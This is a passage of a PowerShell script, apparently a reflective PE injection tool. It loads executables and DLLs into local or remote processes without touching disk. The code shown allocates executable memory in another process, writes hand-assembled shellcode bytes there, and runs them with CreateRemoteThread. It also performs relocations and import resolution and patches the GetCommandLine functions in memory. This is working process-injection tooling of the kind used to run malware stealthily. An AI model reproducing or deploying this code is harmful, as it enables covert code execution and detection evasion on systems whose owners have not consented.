                Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
            }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
        
        #Get address of GetProcAddress
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

        
        #Allocate memory for the address returned by GetProcAddress
        $GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
        }
        
        
        #Write Shellcode to the remote process which will call GetProcAddress
        #Shellcode: GetProcAddress.asm
        [Byte[]]$GetProcAddressSC = @()
        if ($PEInfo.PE64Bit -eq $true)
        {
            $GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $GetProcAddressSC2 = @(0x48, 0xba)
            $GetProcAddressSC3 = @(0x48, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
            $GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            $GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            $GetProcAddressSC2 = @(0xb9)
            $GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
            $GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
        $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
        $SCPSMemOriginal = $SCPSMem
        
        Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
        
        $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if ($RSCAddr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for shellcode"
        }
        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
        if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
        {
            Throw "Unable to write shellcode to remote process memory."
        }
        
        $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
        $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
        if ($Result -ne 0)
        {
            Throw "Call to CreateRemoteThread to call GetProcAddress failed."
        }
        
        #The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
        [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
        $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
        if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
        {
            Throw "Call to ReadProcessMemory failed"
        }
        [IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        
        return $ProcAddress
    }


    Function Copy-Sections
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
        
            #Address to copy the section to
            [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
            
            #SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
            # in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
            # SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
            # so truncate SizeOfRawData to VirtualSize
            $SizeOfRawData = $SectionHeader.SizeOfRawData

            if ($SectionHeader.PointerToRawData -eq 0)
            {
                $SizeOfRawData = 0
            }
            
            if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
            {
                $SizeOfRawData = $SectionHeader.VirtualSize
            }
            
            if ($SizeOfRawData -gt 0)
            {
                Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
                [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
            }
        
            #If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
            if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
            {
                $Difference = $SectionHeader.VirtualSize - $SizeOfRawData
                [IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
                Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
                $Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
            }
        }
    }


    Function Update-MemoryAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $OriginalImageBase,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        [Int64]$BaseDifference = 0
        $AddDifference = $true #Track if the difference variable should be added or subtracted from variables
        [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
        
        #If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
        if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
                -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
        {
            return
        }


        elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
            $AddDifference = $false
        }
        elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
        }
        
        #Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
        [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
        while($true)
        {
            #If SizeOfBlock == 0, we are done
            $BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

            if ($BaseRelocationTable.SizeOfBlock -eq 0)
            {
                break
            }

            [IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
            $NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

            #Loop through each relocation
            for($i = 0; $i -lt $NumRelocations; $i++)
            {
                #Get info for this relocation
                $RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
                [UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

                #First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
                [UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
                [UInt16]$RelocType = $RelocationInfo -band 0xF000
                for ($j = 0; $j -lt 12; $j++)
                {
                    $RelocType = [Math]::Floor($RelocType / 2)
                }

                #For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
                #This appears to be true for EXE's as well.
                # Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
                if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                        -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
                {            
                    #Get the current memory address and update it based off the difference between PE expected base address and actual base address
                    [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
                    [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
        
                    if ($AddDifference -eq $true)
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }
                    else
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }                

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
                }
                elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
                {
                    #IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
                    Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
                }
            }
            
            $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
        }
    }


    Function Import-DllImports
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 4, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle
        )
        
        $RemoteLoading = $false
        if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
        {
            $RemoteLoading = $true
        }
        
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done importing DLL imports"
                    break
                }

                $ImportDllHandle = [IntPtr]::Zero
                $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
                
                if ($RemoteLoading -eq $true)
                {
                    $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
                }
                else
                {
                    $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
                }

                if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
                {
                    throw "Error importing DLL, DLLName: $ImportDllPath"
                }
                
                #Get the first thunk, then loop through all of them
                [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
                [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
                [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
                
                while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
                {
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
                    #Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
                    # If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
                    # and doing the comparison, just see if it is less than 0
                    [IntPtr]$NewThunkRef = [IntPtr]::Zero
                    if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
                    }
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
                    }
                    else
                    {
                        [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
                        $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                        $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
                    }
                    
                    if ($RemoteLoading -eq $true)
                    {
                        [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
                    }
                    else
                    {
                        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
                    }
                    
                    if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
                    {
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
                    
                    $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }

    Function Get-VirtualProtectValue
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        $SectionCharacteristics
        )
        
        $ProtectionFlag = 0x0
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE
                }
            }
        }
        else
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READONLY
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_NOACCESS
                }
            }
        }
        
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
        }
        
        return $ProtectionFlag
    }

    Function Update-MemoryProtectionFlags
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
            [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
            
            [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
            [UInt32]$SectionSize = $SectionHeader.VirtualSize
            
            [UInt32]$OldProtectFlag = 0
            Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
            $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Unable to change memory protection"
            }
        }
    }
    
    #This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
    #Returns an object with addresses to copies of the bytes that were overwritten (and the count)
    Function Update-ExeFunctions
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ExeArguments,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        $ExeDoneBytePtr
        )
        
        #This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
        $ReturnArray = @() 
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [UInt32]$OldProtectFlag = 0
        
        [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
        if ($Kernel32Handle -eq [IntPtr]::Zero)
        {
            throw "Kernel32 handle null"
        }
        
        [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
        if ($KernelBaseHandle -eq [IntPtr]::Zero)
        {
            throw "KernelBase handle null"
        }

        #################################################
        #First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
        # We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
        $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
        $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
    
        [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
        [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

        if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
        {
            throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
        }

        #Prepare the shellcode
        [Byte[]]$Shellcode1 = @()
        if ($PtrSize -eq 8)
        {
            $Shellcode1 += 0x48    #64bit shellcode has the 0x48 before the 0xb8
        }
        $Shellcode1 += 0xb8
        
        [Byte[]]$Shellcode2 = @(0xc3)
        $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
        
        
        #Make copy of GetCommandLineA and GetCommandLineW
        $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
        $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
        $ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
        $ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

        #Overwrite GetCommandLineA
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $GetCommandLineAAddrTemp = $GetCommandLineAAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        
        
        #Overwrite GetCommandLineW
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $GetCommandLineWAddrTemp = $GetCommandLineWAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        #################################################
        
        
        #################################################
        #For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
        # I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
        # It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
        # argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
        $DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
            , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
        
        foreach ($Dll in $DllList)
        {
            [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
            if ($DllHandle -ne [IntPtr]::Zero)
            {
                [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
